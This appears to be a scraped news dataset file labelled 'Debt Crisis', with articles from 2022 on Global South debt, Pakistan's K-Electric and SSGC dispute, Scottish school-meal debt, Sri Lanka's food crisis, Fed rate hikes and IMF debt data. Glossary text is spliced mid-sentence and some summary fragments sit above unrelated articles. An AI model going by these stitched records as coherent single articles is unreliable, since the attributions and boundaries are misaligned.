Egypt has also asked for support from the IMF, as the country struggles to weather the economic impact of Russia’s invasion on Ukraine. Egypt is the Arab world’s most populous nation and has ‘benefited’ from previous IMF loans and programmes. In 2016 it secured a $12bn loan over three years after a crippling foreign currency crisis as it emerged from the political upheavals that followed its 2011 revolution. It also received $8bn in 2020 to deal with the impact of the pandemic, making it one of the biggest borrowers from the IMF after Argentina. At the time of the 2016 agreement, it devalued the currency, which lost half its value against the dollar. Foreign debt investors have also pulled billions of dollars from Egypt in recent months, adding to pressure on its currency.

I’ve raised this before, and both the IMF and the World Bank World Bank

WB The World Bank was founded as part of the new international monetary system set up at Bretton Woods in 1944. Its capital is provided by member states’ contributions and loans on the international money markets. It financed public and private projects in Third World and East European countries.



It consists of several closely associated institutions, among which :



1. The International Bank for Reconstruction and Development (IBRD, 189 members in 2017), which provides loans in productive sectors such as farming or energy ;



2. The International Development Association (IDA, 159 members in 1997), which provides less advanced countries with long-term loans (35-40 years) at very low interest (1%) ;



3. The International Finance Corporation (IFC), which provides both loan and equity finance for business ventures in developing countries.



As Third World Debt gets worse, the World Bank (along with the IMF) tends to adopt a macro-economic perspective. For instance, it enforces adjustment policies that are intended to balance heavily indebted countries’ payments. The World Bank advises those countries that have to undergo the IMF’s therapy on such matters as how to reduce budget deficits, round up savings, enduce foreign investors to settle within their borders, or free prices and exchange rates.



have warned, many countries are emerging from the COVID pandemic slump with a large debt overhang that could cripple their economies if they are forced by creditors, both private and public, to repay. And while many of these countries are small in GDP GDP

Gross Domestic Product Gross Domestic Product is an aggregate measure of total production within a given territory equal to the sum of the gross values added. The measure is notoriously incomplete; for example it does not take into account any activity that does not enter into a commercial exchange. The GDP takes into account both the production of goods and the production of services. Economic growth is defined as the variation of the GDP from one period to another. size, they are huge in population. The IMF’s debt database shows that the external debt stock Debt stock The total amount of debt of low- and middle-income countries in 2020 rose, on average, 5.6 per cent to $8.7 trillion. However, for many countries, the increase was in double digits. The external debt stock of countries eligible for the Group of Twenty (G-20) Debt Service Debt service The sum of the interests and the amortization of the capital borrowed. Suspension Initiative (DSSI) rose, on average, 12 per cent to $860 billion and in some of them by 20 per cent or more. And that debt initiative, which just suspends payments on debts for a few years, has now come to an end.

The combined debt service paid by DSSI-eligible countries in 2020 on external public and publicly guaranteed debt, including the IMF, totalled $45.2 billion, of which principal accounted for $31.1 billion and interest for $14.1 billion. The 2020 debt service comprised $26.4 billion (58 per cent) paid to official bilateral and multilateral credi­tors and $18.8 billion (42 per cent) to private creditors, that is, bondholders, commercial banks, and other private entities. Many small countries have external debt levels well above 100% of annual GDP.

Prior to the start of the Russian invasion of Ukraine, the impact of the pandemic on low-income countries’ public spending and revenues had produced an increase in their gross sovereign borrowing equivalent to about 25 per cent of their GDP.

Capital flows to the poorer countries of the world by the imperialist core have been falling since the end of the Great Recession, another indicator of the decline in globalisation. In 2011, $1.3trn went into the ‘Global South’ from the Global North. In 2020, that annual figure had fallen to $900bn, a 30% fall. And remember that over half of all financial flows to the Global South go to China. Excluding China, the fall in capital flows to the poorest countries is even greater. Over the past decade, almost 60 per cent of net aggregate financial flows to low- and middle-income countries from external creditors and investors went to China. Over this period China received inflows of close to $4 trillion, of which 40 per cent were debt-creating flows and 60 per cent were foreign direct investment and portfolio equity Equity The capital put into an enterprise by the shareholders. Not to be confused with ’hard capital’ or ’unsecured debt’. flows. In 2020, aggregate financial flows to China rose 32 per cent to $466 billion, driven by a 62 per cent increase in net debt inflows to $233 billion and a 12 per cent rise in net equity inflows also to $233 billion.

Private creditors (investment funds Investment fund

Investment funds Private equity investment funds (sometimes called ’mutual funds’ seek to invest in companies according to certain criteria; of which they most often are specialized: capital-risk, capital development funds, leveraged buy-out (LBO), which reflect the different levels of the company’s maturity. etc) have cut back on their investment in the government and corporate bonds Corporate bonds Securities issued by corporations in order to raise funds on the Money Markets. These bonds resemble government bonds but are considered to be more risky than government bonds and other guaranteed securities such as Mortgage Backed Securities, and therefore pay higher interest rates. of poor countries and international banks have stopped lending. Much of the capital flows into these poor countries was not even for productive investment but merely to cover previous debts or for speculation by foreign investors in local financial markets. Foreign direct investment (FDI) has fallen from $600bn in 2011 (or about 40% of all capital flows) to $434bn in 2020. You might argue that financial investments by foreign multinationals and investment speculators are the last thing these countries need. But if foreign capitalists are reducing their investments, what is to replace them, either for productive investment in these poor economies or just to cover existing debt repayments? The answer is IMF-World Bank money with all sorts of conditions, and increased remittances by those who left their countries and got jobs and incomes working abroad. For all the data – see the table below.

One controversial issue in capital flows to the Global South is the role of China. China has become an important creditor to many poor countries, starved of funds by the ‘West’ and desperate for credit to cover existing debts and to carry out infrastructure and productive projects. Low- and middle-income countries’ combined debt to China was $170 billion at end-2020, more than three times the comparable level in 2011. To put this figure in context, low- and middle-income countries’ combined obligations to the International Bank for Reconstruction and Development were $204 billion at the end-2020 and to the International Development Association $177 billion. Most of the debt owed to China relates to large infrastructure projects and operations in the extractive industries. Countries in Sub-Saharan Africa, led by Angola, have seen one of the sharpest rises in debt to China although the pace of accumulation has slowed since 2018. The region accounted for 45 per cent of end-2020 obligations to China. In South Asia, debt to China has risen, from $4.7 billion in 2011 to $36.3 billion in 2020, and China is now the largest bilateral creditor to the Maldives, Pakistan, and Sri Lanka.

Some argue that this shows China is just as ‘imperialist’ as the West and that China is putting poor countries into a permanent ‘debt trap’. But the evidence for this is weak. Most Chinese credits are on no worse terms than that offered by the IMF and other bilateral creditors, and in many cases are much better. China is supposed to use ‘debt diplomacy’ against the interests of debtor nations. But debt diplomacy is actually used by the West more, as the examples of Argentina and Ukraine show.

In sum, debts to foreign investors and financial institutions owned by the Global South have accelerated during the COVID pandemic and ‘debt relief’ has been no such thing. Now the Ukraine conflict is increasing the risk of defaults and economic recession for these countries as inflation spirals, interest rates rise and economic growth falls away.

Net transfers of financial resources from developing to developed countries far exceed any compensation by net overseas development aid (ODA ODA

Official Development Assistance Official Development Assistance is the name given to loans granted in financially favourable conditions by the public bodies of the industrialized countries. A loan has only to be agreed at a lower rate of interest than going market rates (a concessionary loan) to be considered as aid, even if it is then repaid to the last cent by the borrowing country. Tied bilateral loans (which oblige the borrowing country to buy products or services from the lending country) and debt cancellation are also counted as part of ODA. Apart from food aid, there are three main ways of using these funds: rural development, infrastructures and non-project aid (financing budget deficits or the balance of payments). The latter increases continually. This aid is made “conditional” upon reduction of the public deficit, privatization, environmental “good behaviour”, care of the very poor, democratization, etc. These conditions are laid down by the main governments of the North, the World Bank and the IMF. The aid goes through three channels: multilateral aid, bilateral aid and the NGOs. ) flows to developing countries, which averaged less than $100bn a year In 2012, the last year of recorded data, developing countries received a total of $1.3tn, including all aid, investment, and income from abroad. But that same year some $3.3tn flowed out of them. In other words, developing countries sent $2tn more to the rest of the world than they received. If we look at all years since 1980, these net outflows add up to an eye-popping total of $16.3tn.

What’s the answer? Well, the obvious global one is to cancel the debts owed by all these poor countries. Based on the amount their governments are spending on debt payments that leave the country, the Jubilee Debt Campaign estimates that people in 54 countries are currently living in debt crisis, up from 31 in 2018 and 22 in 2015. As well as the 54 countries in debt crisis, the Jubilee Debt Campaign estimates that 14 countries are at risk of a public or private debt crisis, 22 at risk of just a private sector debt crisis, and 21 just a public sector debt crisis.

Then there are national solutions. First, governments need to put in place capital controls to stop the reckless flow of speculative capital that destroys national currencies and provokes financial crises. Capital controls are also needed to stamp out illicit and criminal capital flows. US-based Global Financial Integrity (GFI) calculates that developing countries have lost a total of $13.4tn through unrecorded capital flight since 1980.

Even the IMF has admitted that capital controls should be a weapon available to a national government to protect its financial assets and household savings from asset Asset Something belonging to an individual or a business that has value or the power to earn money (FT). The opposite of assets are liabilities, that is the part of the balance sheet reflecting a company’s resources (the capital contributed by the partners, provisions for contingencies and charges, as well as the outstanding debts). stripping and rich individual and corporation capital flight. The IMF now says that countries should have “more flexibility to introduce measures that fall within the intersection of two categories of tools: capital flow management measures (CFMs) and macroprudential measures (MPMs)”. And controls could be “applied pre-emptively, even when there is no surge in capital inflows, to the policy toolkit.”

Ultimately, the only way poor countries can reduce their exploitation by multinationals and international finance is through state control of the banking and strategic sectors of their economies.

Accordingly, gas supplies and payments therein were honoured by both the parties from July 1, 2012 with minor exceptions.
KE has recently started to default in making timely payments to SSGC against RLNG weekly gas bills.
SSGC is facing recovery issues from major industrial customers who have obtained stay against increase in gas prices and an amount of Rs.
He maintained that significant old receivables from KE and PSML are also amongst the unresolved chronic issues and adding misery to cash flows of SSGC.","ISLAMABAD: K-Electric (KE) has sought immediate payment of Rs 25 billion from the federal government to clear outstanding amount of SSGC as the latter has threatened to encash bank guarantee of Rs 6 billion provided by former as security deposit in addition to immediately reducing gas supplies by 10 MMCFD on daily basis, which may increase load-shedding.

This was the crux of two letters separately written by KE to Finance Minister, Dr. Miftah Ismail and Managing Director SSGC to Secretary Petroleum, Ali Reza Bhutta.

KE’s Chief Regulatory Affairs and Government Relations Officer, Imran Qureshi, in his letter to Finance Minister, has given reference to SSGC’S letter of June 9, 2022 through which the gas utility has intimated curtailment in gas supply to KE, a meeting of June 07, 2022 and previous correspondence for release of KE’s outstanding Tariff Differential Subsidy (TDS) claims.

KE argues that due to the continuous accumulation of KE’s TDS claims, its cash flow position is significantly strained and the company’s total borrowings have reached an unsustainable level of Rs 261 billion, which includes Rs 141 billion mainly on account of working capital requirements.

Whilst the banks have financed the historical increase in fuel prices, on one hand exposure to KE has already reached an alarming level and on the other the lending capacity of majority of the banks has already been exhausted due to which KE is no longer in a position to finance the existing and incremental price hike, he added.

KE endeavours to get more gas or RLNG at natural gas rate

Power utility has urged on government for immediate release of at least Rs 25 billion, enabling it to manage the company’s severely constrained cash flow position and keep the operations afloat by making payments to fuel suppliers.

“Due to the precarious situation, any delay may significantly impact the sustainability of KE’s operations, resulting in a potential power supply crisis for Karachi, the ramifications of which would be far-reaching for the city’s residents and businesses,” Qureshi maintained. Earlier, Imran Munir, Managing Director, SSGC in a letter to Secretary Petroleum stated that the gas utility is supplying gas to KE on best endeavour basis on a commitment to pay the gas bills on due dates since 2012, as a consequence of order of Sindh High Court. Accordingly, gas supplies and payments therein were honoured by both the parties from July 1, 2012 with minor exceptions.

KE has recently started to default in making timely payments to SSGC against RLNG weekly gas bills. The default started on May 26, 2022 and is continuing. KE has only paid Rs. 750 million against last bill of Rs. 8.631 billion leaving an outstanding balance of Rs. Rs 7.881 billion.

According to MD SSGC, KE also defaulted in March 2020 against RLNG gas bill of Rs 1.015 billion due on March 26, 2020 and linked the default and future gas bill payments to realization of Tariff Differential Subsidy from the Government of Pakistan (GoP); however, with the intervention of Federal Government, SSGC was successful in realizing its over-dues. Petroleum Division, well aware of the fact that SSGC is severely trapped in circular debt crisis, delays in the revision of gas prices, causing huge funds stuck in Gas Development Surcharge (GDS) of Rs 248 billion. SSGC is facing recovery issues from major industrial customers who have obtained stay against increase in gas prices and an amount of Rs. 30 billion is stuck due to court stays which has affected its already precarious cash flow position and has posed a negative impact on its pattern of payments to suppliers.

He maintained that significant old receivables from KE and PSML are also amongst the unresolved chronic issues and adding misery to cash flows of SSGC. Huge funds stuck in tax refunds is another long outstanding issue.

“KE default is causing delay in SSGC ability to make timely payments to SNGPL against RLNG retention, which will ultimately hamper the LNG supply chain and may add to situation of an international default,” he claimed.

""We will continue to work with our partners in local authorities to plan for the expansion of free school meal provision.""","More than £1 million owed in school meal debt is just the ""tip of the iceberg"" as thousands of families in Scotland are struggling with hunger, experts have warned.

Research commissioned by the Aberlour children's charity reveals the extent of school meal debt and highlights an increase in ""hidden hunger"" among Scottish pupils.

The total debt owed by families of pupils in their final two years of primary school (P6-7) is £1,032,500; all younger primary school pupils in Scotland (P1-5) are eligible for free school meals.

The research, conducted by Professor Morag Treanor, from Heriot-Watt University's Institute for Social Policy, Housing and Equalities Research (I-SPHERE), has prompted urgent calls for the extension of free school meals.

Low-income families are gradually being excluded as income thresholds for free school meals increase, while far fewer children are eligible for free school meals today than 20 years ago, the research finds.

Cost-of-living crisis: call to extend free school meals

Meanwhile, food hunger is harder to quantify in secondary school, with some students choosing to go hungry rather than face the stigma and shame of requesting a voucher that identifies them as having no money on their school meal account.

Martin Canavan, head of policy and participation at Aberlour, has urged the Scottish government to widen eligibility for free school meals immediately.

He said: ""We believe that, in a country as rich as Scotland, no child should ever go hungry. We're very concerned about hidden school hunger and believe there are likely significant numbers of children going hungry in school across Scotland.

""In the last 10 years we've seen child poverty rise significantly, yet far fewer families are eligible for free school meals now than they were when the thresholds were introduced 20 years ago.""

Mr Canavan added: ""The issue of school hunger and the significant number of children going hungry every single day means we are failing as a country to protect children's human rights - specifically, the right to food.

""We are calling on the Scottish government to maximise eligibility for free school meals for low-income working families with immediate effect.

""This will ensure more families receive this entitlement, reduce financial hardship, help end school meal debt and reduce the likelihood of hunger in schools.""

The research highlights inconsistencies in how local authorities recover school meals debt: some children are denied school meals and, in some cases, debt is carried over from primary to secondary schools.

Professor Treanor said: ""The debt highlighted through our research is, we believe, just the tip of the iceberg as the number of families struggling to pay for a school meal in Scotland continues to soar.

""We have unquantified levels of hidden hunger in secondary schools. Children going hungry has a catastrophic impact on their health, wellbeing and educational attainment.""

While the Scottish government's commitment to expand free school meal provision has been widely welcomed - albeit the initial August 2022 deadline for universal free school meals in primary was delayed - Professor Treanor said ""immediate action"" is necessary, given the rising cost-of-living crisis.

A Scottish government spokesperson said: ""Cost-of-living rises are putting a huge strain on some families and they are facing unforeseen challenges.

""Pupils in Primary 1-5 at publicly funded schools already benefit from universal free school lunches during term time, as well as eligible pupils within other age groups, saving families on average £400 per child per year.

""We will continue to work with our partners in local authorities to plan for the expansion of free school meal provision.""

The spokesperson added: ""Councils have the power to make discretionary offers of free school meals to families, where they are experiencing financial hardship due to exceptional circumstances, who do not meet the regular eligibility criteria.

""We would also urge local authorities to do all they can to resolve any payment issues.""",Debt Crisis,2022-06-08 16:17:29

At present, the UN estimates that nearly a quarter of the island nation’s population requires food assistance and lacks basic dietary needs and nutritious requirements.

of 2019, as much as 9.1 per cent of the Sri Lankan population was at the risk of not having access to basic food items, out of which 0.9 per cent or nearly 200,000 people were on the brink of facing starvation, the Department of Census and Statistics said. The share of food insecurity surged to 9.45 per cent at the household level, indicating that one in every 10 families had serious issues when accessing dietary needs and nutritious requirements, the nodal agency said.

However, the situation turned worse in 2020 when the authorities closed down the country and imposed severe and prolonged restrictions on economic activities for two years due to COVID-19, destroying people’s livelihoods and plunging them into poverty, it said. In April last year, President Gotabaya Rajapaksa announced a controversial ban on chemical fertilisers, which led to a crippling blow to the production of rice and other essential food items.

Prior to the fertiliser ban, Sri Lanka was self-sufficient in rice production. The situation was exacerbated by an acute scarcity of foreign exchange reserves, which meant that the Sri Lankan economy would head into a tailspin.

The UN Resident Coordinator in Sri Lanka, Hanaa Singer-Hamdy had said that nearly 4.9 million are currently in need of food assistance, making up for nearly 25 per cent of the country’s population. With Sri Lanka in the throes of an impending food shortage, Prime Minister Ranil Wickremesinghe spoke to David Beasley, the Executive Director at the United Nations World Food Programme on Friday and invited him to visit the country.

Last week, the United Nations appealed for USD 47.2 million to provide life-saving assistance to crisis-hit Sri Lanka, as it noted that the shortage of medicines and surgical consumables will ease in the medium term with the support of a credit line from India and other partners. The UN team in Sri Lanka and non-governmental organisations launched the joint Humanitarian Needs and Priorities Plan on Thursday, calling for USD 47.2 million to provide life-saving assistance to 1.7 million people worst-hit by the economic crisis in Sri Lanka over a four-month period between June and September.

Meanwhile, India has also provided a USD 55 million Line of Credit to Sri Lanka for the import of fertilisers, in a bid to help the island nation tide over its food scarcity, the Indian High Commission said on Friday. Earlier this month, Wickremesinghe met senior officials of the FAO as well as the United Nations Development Programme and briefed them about the situation faced by the country.

The Prime Minister lamented that fertilisers and fuel shortages are the two biggest hurdles facing the country’s agricultural sector. Addressing Parliament recently, Wickremesinghe said Sri Lanka will need USD 5 billion to ensure that the people’s daily lives are not disrupted for the next six months.

The nearly bankrupt country, with an acute foreign currency crisis that resulted in foreign debt default, announced in April that it is suspending nearly USD 7 billion foreign debt repayment due for this year out of about USD 25 billion due through 2026. Sri Lanka’s total foreign debt stands at USD 51 billion.

The economic crisis has prompted an acute shortage of essential items like food, medicine, cooking gas and other fuel, toilet paper and even matches, with Sri Lankans for months being forced to wait in lines lasting hours outside stores to buy fuel and cooking gas.

This commentary was published with permission of Project Syndicate—Private-Debt Risks Are Hiding in Plain Sight","WASHINGTON (Project Syndicate)—When Russian tanks rolled into Ukraine, private-debt crises were probably already brewing—albeit hidden from view—in many parts of the world, as a result of the economic disruptions caused by the COVID-19 pandemic. Now, the war is pushing even more countries toward similar crises.

The pandemic recovery has always been uneven. According to analysis based on the International Monetary Fund’s most recent World Economic Outlook, per capita income hit a new high in almost 37% of advanced economies in 2021. That share drops to about 27% in middle-income countries and under 21% in low-income countries. And these disparities may be about to deepen.

Debt moratoriums

Early in the pandemic, many countries introduced debt moratoriums, in order to give households and businesses a reprieve at a time when many faced a sharp income decline that left them struggling to meet their obligations.

The moratoriums were often accompanied by policies that gave banks the regulatory flexibility not to reclassify the affected loans in a higher risk category, as is typically required, thereby enabling banks to avoid the higher capital provisioning that reclassification would entail. Policy makers hoped that banks would use the available liquidity to continue lending.

But while the moratoriums did provide temporary relief for private debtors and may have limited the fallout of the early pandemic disruption, they were not without drawbacks. In particular, forbearance policies made it more difficult for banking supervisors to detect the early warning signs of rising loan defaults, resulting in a hidden—but potentially disastrous—nonperforming loan (NPL) problem.

With the emergency moratoriums having now ended in many countries, vulnerable households and businesses, particularly small and medium-size firms, confront loan repayments they can no longer afford. This threatens to lead to a wave of defaults, with far-reaching implications for the economic recovery, especially in the low- and middle-income countries that are already struggling to revive growth.

Denial

There is still time to limit the damage.

But this will require private- and public-sector actors to acknowledge the problem before it erupts into a full-blown crisis and manage it effectively. And so far, there seems to be little appetite for the kind of transparency that this would demand. In fact, according to the data financial institutions have provided to the IMF, there is no problem at all: NPL rates remained flat between 2019 and 2020 in a large sample of advanced and emerging economies that adopted forbearance policies.

Data from the Mastercard Economics Institute, which covers 165 countries, also tells a very different story, with permanent business failures rising nearly 60% in 2020 from their prepandemic (2019) baseline. Although the situation improved in 2021, roughly 15% of countries, most of them low and middle income, still recorded increases in permanent business failures.

The World Bank Pulse Enterprise Survey, covering 24 low- and middle-income countries, presents a similarly troubled picture. As the chart above shows, as of January 2021, 40% of surveyed businesses expected to be in arrears within six months, including more than 70% of firms in Nepal and the Philippines and over 60% of firms in Turkey and South Africa.

Credit crunch

As more governments unwind debt moratoriums, the risks will only grow. If the past is any guide, rising NPLs will lead to less new lending, as financial institutions attempt to avoid exceeding their capital-provisioning limits and become more risk averse. A credit crunch would not only hamper the economic recovery; it would also exacerbate inequality by disproportionately affecting lending to low-income communities and smaller businesses.

Where one or more systemically important lenders lack the capital to cover their losses, government may need to step in to recapitalize them. This could mean simply transferring the solvency problem to the public sector at a time when governments already face heavy debt burdens and strained budgets.

Russia’s war on Ukraine compounds the risks by intensifying inflationary pressures and undermining the recovery in many emerging-market economies. The war’s impact is particularly acute in Central Asia, where banks are highly exposed to Russian financial institutions and connected to one another via large cross-border remittance flows. New capital and foreign-exchange controls are also creating risks for financial institutions.

Steps to take

It is time to recognize and address this hidden crisis. The World Bank’s 2022 World Development Report lays out concrete steps policy makers can take. First, countries must increase the transparency of financial-sector balance sheets. Clear, consistent practices for reporting on asset quality, enforced by effective supervision, are essential. Financial institutions must also develop their capacity to manage NPLs, so that an increase in defaults does not prevent further lending.

Countries should also establish or enhance legal insolvency mechanisms, including hybrid out-of-court options involving conciliation and mediation arrangements. Such systems—which many emerging-market and developing economies currently lack—can hasten the resolution of debt distress and limit damage to the financial sector. Accessible and inexpensive debt-resolution procedures that reduce the extent of court involvement in restructuring are particularly important for micro, small, and medium-size enterprises, as well as for entrepreneurs and individuals.

Finally, regulators and lenders must ensure that households and businesses retain access to credit. An exceptionally uncertain economic environment, together with a lack of transparency about borrowers’ financial condition, has increased risks and reduced the efficacy of traditional methods for measuring them. Lenders must explore new, technology-enabled approaches to risk management and loan delivery, enabled by revised government regulations that both support innovation and ensure enforceable consumer and market protection.

Experience has shown that loan-quality issues do not fix themselves; unless addressed in a timely fashion, problems continue to grow, implying higher costs for the financial system and the real economy. If we do not heed this lesson, the hidden NPL problem will soon become impossible to ignore.

A 100 days Into the Ukraine conflict, the war and ensuing sanctions imposed on Russia are having major implications on global food and energy markets as both countries are significant exporters of grains (especially wheat and barley), agricultural fertilizers (such as potassium, nitrogen, phosphorus); and Russia is a major global producer and exporter of crude oil and natural gas.

This does not happen In a vacuum. Since early 2020, COVID-19 has negatively Impacted household income and demand resulting in global supply chain bottleneCkS, rising inflation, and record debt of many countries - which, in turn, has disrupted the economic recovery from the pandemic. In addition, the effects of climate change are threatening to reduce yields in global bread baskets such as China (delayed rains) and India (heat waves).

Against this backdrop of overlaying shocks, the UN Secretary General Antonio Guterres warned on May 18 of the ""spectre of a global food shortage"" that could last for years.

The UN General Assembly on May 23 adopted a resolution addressing the looming global food crisis in which it calls on the international community to urgently support countries affected by the food insecurity through coordinated action.

Along similar lines, the Group of Seven (G7) industrialized nations issued a warning on May 14 about the risk of a world hunger crisis unless Russia lifts a blockade on Ukrainian grain that's currently stuck at Ukrainian ports. The statement also stressed that war in Ukraine will threaten food security of the world's poorest.

To understand how these shocks are impacting food availability and access to markets in Cambodia, the World Food Programme (WFP) together with the Agricultural Marketing Office (AMO) monitors the retail and wholesale prices of key food commodities In 45 urban and rural markets across the country (see Methods section). An average of around 250 traders and market chiefs are called every two weeks. Market chiefs are also interviewed to assess market functionality, including supply and demand issues.",Debt Crisis,2022-06-13 12:15:30

It was likely just the first in a sequence of rate increases designed to tame stubbornly high inflation. Since the start of the year, the Fed chair and his colleagues have indicated that the central bank would be raising short-term rates and have reiterated that the Fed was committed to taking “the measures necessary” to reduce inflation.

Economists have debated the extent to which this bout of inflation is the result of expansionary fiscal and monetary policy—low interest rates and large amounts of government spending, particularly transfers to households—or of pandemic-specific factors, including disruptions to global supply chains and, consequently, rising prices for commodities and manufactured goods. It remains unclear whether the rate increases the Federal Reserve has planned out will be sufficient to tame rising prices or the extent to which they will curtail economic growth.

But whatever the impact, rising interest rates will not just affect the United States. Higher U.S. rates raise the cost of borrowing in U.S. dollars on international markets. They also increase demand for U.S. dollar assets relative to assets in other currencies, and they can therefore cause those currencies to fall in value. For countries where external debt is denominated in U.S. dollars, debt repayment will become more expensive.

These consequences are likely to be most severe in some low- and middle-income countries. Relative to wealthier states, these countries generally have worse credit, and it costs them more to borrow. They are also more likely to borrow in U.S. dollars. It will be especially bad for developing and emerging markets that are still grappling with the pandemic’s economic fallout, as well as those that are net importers of food and energy, the prices of which have risen dramatically as a consequence of the war in Ukraine. These countries will likely see more debt distress and large currency devaluations, hampering their economic growth and making it more difficult for them to reduce poverty.

AROUND THE WORLD

The U.S. financial market is by far the planet’s largest, and the dollar is the world’s principal reserve currency. It is the backbone of international loans and the main currency of use in international trade transactions and internationally traded bonds. As a result, Federal Reserve actions have an outsized effect on the economies of other countries.

That is especially true in emerging markets and developing countries, which often rely on the U.S. dollar for international borrowing. When the Fed raises interest rates to help tame U.S. inflation, external borrowing in dollars becomes more expensive. The hikes can also stoke inflation in other economies: as U.S. assets yield higher returns they become more attractive to investors relative to the assets of other countries, driving up the value of the dollar. This raises the cost of imports, which are often priced in dollars. It also makes it more expensive for governments and firms in developing countries to pay off their existing debts in U.S. dollars. The result can be domestic austerity measures, resulting in lower economic growth. (These effects are more modest in advanced economies, since they borrow primarily in their domestic currency and their domestic prices are less likely to rise when their currencies depreciate.)

The U.S. interest rate increases come in challenging times. To cushion the effects of the pandemic, many poorer countries had to take on more debt, and with the decline in economic activity caused by the pandemic, they are struggling to service or repay that debt. Tourism-dependent economies, for instance, saw their main source of external revenue dry up as international travel came to a standstill. Many emerging and developing economies are also already facing domestic inflation, triggered by pandemic-related production disruptions and rising global energy and food prices. Rising food costs, in particular, stoke inflation in emerging and developing economies, where residents spend a higher percentage of their income on groceries than do residents of richer states. They can also trigger social unrest.

The Federal Reserve, of course, can only directly set short-term interest rates, and U.S. long-term rates—such as the yield on government bonds that mature in ten years—also have an important effect on both economic activity and long-term rates in other countries. This is, again, particularly true in emerging and developing economies. But when the Fed tightens its monetary policy, it can cause these rates to rise, as well. And they are already going up: between the end of 2021 and March 31, 2022, the interest rate on 10-year U.S. Treasury securities rose by one percentage point.

A quick, painless end to U.S. inflation is not a foregone conclusion.

So far, this is a relatively small increase. It suggests that markets currently expect the increase in short-term interest rates is going to reverse at some point—and hence that U.S. inflation will eventually abate. For emerging markets and developing countries, that would be very good news. If the long-term rate increase remains modest, the repercussions for the developing world will be more contained.

But unfortunately, a quick, painless end to U.S. inflation is not a foregone conclusion. The world is encountering its first bout of meaningful inflation in decades, an experience that is compounded by uncertainty around the pandemic and the war in Ukraine. And U.S. inflation has already defied expectations, exceeding 2021 forecasts by a wide margin. If demand remains strong in the United States and if the country’s labor markets remain tight, inflation could prove even more stubborn than most forecasts suggest. The Fed would then have to enact rate hikes that will be more rapid and sharp than the markets currently expect them to be, leading to higher long-term interest rates. The U.S. economy may then slow more sharply, and international financial repercussions would be more severe.

Indeed, the uncertainty itself could harm poor and middle-income countries. During periods of high economic and geopolitical uncertainty, investors tend to withdraw from riskier assets. That includes holdings in emerging markets, which have more volatile economic prospects and higher political and policy uncertainty. The unfortunate end result could again be an outflow of capital from developing countries—the places most in need of investment.

BUCKLING UP

It is hard for economists to predict the future, and analysts need to be modest in their forecasts. No one knows exactly what path U.S. inflation will take, how the Federal Reserve will respond, and what the ultimate consequences will be for other countries.

But the past can provide a guide for what it looks like in the developing world when the United States tightens its monetary policies. In some cases, history offers reason for hope. When the Federal Reserve increased interest rates from one percent to 5.25 percent between 2004 and 2006, emerging market economies did not experience financial turbulence, in part because the U.S. and the world economy were growing rapidly. In mid-2013, investors expected that the Federal Reserve would raise rates (they ultimately didn’t), and as a result, long-term interest rates went up by one percentage point, as has happened so far today. Several emerging markets faced declining purchases or outright sales of their debt securities by foreign residents and saw their currencies lose value. But both effects waned in a few months.

In other instances, rate hikes have had more notable consequences. Between February 1994 and February 1995, the Fed raised short-term interest rates by roughly three percentage points, and long-term interest rates went up by some two percentage points. The increases—together with domestic economic and political factors—led the Mexican peso to collapse, causing a recession in the country. Mexico eventually needed an international bailout to stave off default. Argentina was also severely affected. But even then, there was no wider wave of emerging market crises. Similarly, when the Fed raised its rates between March and December 2018, Argentina and Turkey faced large currency depreciations, but the fallout elsewhere was contained.

Yet rate hikes, if big enough, can lead to broad problems. In the late 1970s and early 1980s, U.S. Federal Reserve chair Paul Volcker nearly doubled interest rates—up to 20 percent—to try and tame persistent inflation in the United States. He succeeded, but the shockwaves of tightening U.S. monetary policy triggered a widespread debt crisis and numerous defaults in emerging and developing economies. Between 1981 and 1983, GDP fell by 2.8 percent in Brazil, four percent in Mexico, 7.5 percent in Venezuela, and an astounding 16 percent in Chile.

Rate hikes, if big enough, can lead to broad problems.

The effect of the current rate hikes today may yet be modest. Many middle-income countries—including most of the largest ones—have stronger economic institutions (including independent central banks) than they did in the 1970s and 1980s, or even the first decade of this century. They are less dependent on borrowing in dollars, and they hold larger foreign exchange reserves. They also allow the value of their currencies to float more than they did in the past, which means they can allow their currencies to depreciate during periods of stress without provoking such severe domestic economic repercussions. In addition, high commodity prices help emerging and developing economies that are commodity exporters, which can now sell their goods at higher prices.

But many poorer countries are not as well insulated, and U.S. inflation is at its highest level in decades. Washington’s policy adjustment may be more abrupt than anything it has done since 1994. The Fed’s actions could be compounded by rising interest rates from other central banks, given that many advanced and emerging economies are also dealing with heightened inflation. And this tightening will come as the world economy is still dealing with the consequences of the pandemic, and as it reckons with the war in Ukraine. That means that, although there is unlikely to be a severe crisis across major emerging economies, there are many vulnerable countries—already facing increased poverty—where high levels of external debt may prove to be unsustainable. An increasing number of countries may approach the International Monetary Fund for a loan, as Sri Lanka did recently, and face debt renegotiations with external creditors.

Since the pandemic began, the World Bank, the International Monetary Fund, and the world’s richest countries have all discussed the need to offer debt relief to the poorest states and to other countries facing the most severe economic consequences of the pandemic. As the Fed works to control U.S. inflation, the necessity of such relief will grow increasingly pressing. The bulk of the developing world may be able to ride out the storm. But should U.S. rates rise sharply, more countries will need international financial support and face debt restructuring to avoid calamitous economic contractions.",Debt Crisis,2022-04-08 07:00:00

Policymakers must strike the right balance in the face of high debt and rising inflation.

In 2020, we observed the largest one-year debt surge since World War II, with global debt rising to $226 trillion as the world was hit by a global health crisis and a deep recession. Debt was already elevated going into the crisis, but now governments must navigate a world of record-high public and private debt levels, new virus mutations, and rising inflation.

Global debt rose by 28 percentage points to 256 percent of GDP, in 2020, according to the latest update of the IMF’s Global Debt Database.

Borrowing by governments accounted for slightly more than half of the increase, as the global public debt ratio jumped to a record 99 percent of GDP. Private debt from non-financial corporations and households also reached new highs.

The debt surge amplifies vulnerabilities, especially as financing conditions tighten.

Debt increases are particularly striking in advanced economies, where public debt rose from around 70 percent of GDP, in 2007, to 124 percent of GDP, in 2020. Private debt, on the other hand, rose at a more moderate pace from 164 to 178 percent of GDP, in the same period.

Public debt now accounts for almost 40 percent of total global debt, the highest share since the mid-1960s. The accumulation of public debt since 2007 is largely attributable to the two major economic crises governments have faced—first the global financial crisis, and then the COVID-19 pandemic.

The great financing divide

Debt dynamics, however, differ markedly across countries. Advanced economies and China accounted for more than 90 percent of the $28 trillion debt surge in 2020. These countries were able to expand public and private debt during the pandemic, thanks to low interest rates, the actions of central banks (including large purchases of government debt), and well-developed financial markets. But most developing economies are on the opposite side of the financing divide, facing limited access to funding and often higher borrowing rates.

Looking at overall trends, we see two distinct developments.

